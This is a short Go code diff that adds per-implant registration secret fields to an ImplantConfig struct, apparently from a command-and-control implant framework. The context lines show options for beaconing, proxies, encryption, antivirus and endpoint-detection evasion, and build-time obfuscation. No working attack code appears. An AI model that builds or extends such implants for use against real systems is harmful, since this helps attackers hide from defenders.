@@ -373,6 +373,8 @@ type ImplantConfig struct {
 	Proxy         string // HTTP proxy URL (e.g. "http://proxy:8080")
 	CryptoKey     string // 32-byte hex key for StreamCipher (empty = disabled)
 	BeaconKey     string // PSK sent as envelope "key" + X-Beacon-Key header (empty = no PSK auth)
+	RegSecretID   string // v3 per-implant registration secret id (compiled into the binary)
+	RegSecret     string // v3 per-implant registration secret, base64 (replaces BeaconKey in v3 builds)
 	ExpiryDate    string // Compile-time expiry date "YYYY-MM-DD" (empty = disabled)
 	Evasion       bool   // Enable chunked sleep obfuscation (Windows EDR basics)
 	Obfuscate     bool   // Enable garble build-time obfuscation (string/literal hiding)
